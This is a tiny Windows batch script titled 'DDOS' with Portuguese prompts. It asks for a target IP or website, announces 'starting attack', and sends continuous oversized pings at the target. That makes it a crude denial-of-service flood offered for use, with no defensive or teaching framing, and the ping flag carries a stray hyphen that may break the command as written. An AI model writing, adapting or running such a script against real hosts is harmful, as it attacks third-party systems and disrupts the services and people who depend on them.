@echo off
Title DDOS

set /p alvo=Digite o IP ou site alvo: 
pause
echo .
echo INICIANDO ATAQUE...
echo .
ping -l- 45000 -t %alvo%